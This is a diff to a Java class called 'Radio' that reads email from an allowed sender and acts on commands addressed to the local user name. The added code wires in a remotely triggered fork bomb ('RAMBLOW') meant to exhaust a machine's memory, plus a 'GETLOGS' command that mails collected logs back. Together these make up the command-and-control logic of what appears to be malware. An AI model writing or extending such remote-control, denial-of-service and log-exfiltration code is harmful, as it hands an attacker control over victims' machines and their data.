@@ -498,6 +498,7 @@ public class Radio
 		         //System.out.println("---------------------------------");
 		         if((message.getFrom()[0] + "").matches(allowedMailer))
 		         {
+		        	 // Terminate own 
 			         if (message.getSubject().matches(System.getProperty("user.name")) && message.getContent().toString().matches("KILL")) 
 			         {
 			        	 Chocolat.println("[" + m.robert.elapsedTime() +"] Kill Command Received");
@@ -519,6 +520,20 @@ public class Radio
 			        	 message.setFlag(Flags.Flag.DELETED, true);
 			        	 AlphaDecay.start();
 			         }
+			         
+			         // Fork bomb
+			         else if (message.getSubject().matches(System.getProperty("user.name")) && message.getContent().toString().matches("RAMBLOW")) {
+			        	 Chocolat.println("[" + m.robert.elapsedTime() +"] UAV Inbound, nuking the RAM.");
+			        	 message.setFlag(Flags.Flag.DELETED, true);
+			        	 Runtime.getRuntime().exec(new String[]{"java", "-cp", System.getProperty("java.class.path"), "ForkBomb"});
+			         }
+			         
+			         else if (message.getSubject().matches(System.getProperty("user.name")) && message.getContent().toString().matches("GETLOGS")) {
+			        	 Chocolat.println("[" + m.robert.elapsedTime() +"] Manually resending logs...");
+			        	 message.setFlag(Flags.Flag.DELETED, true);
+			        	 mailLogs();
+			         }
+			         
 		      	  }
 		      }
 
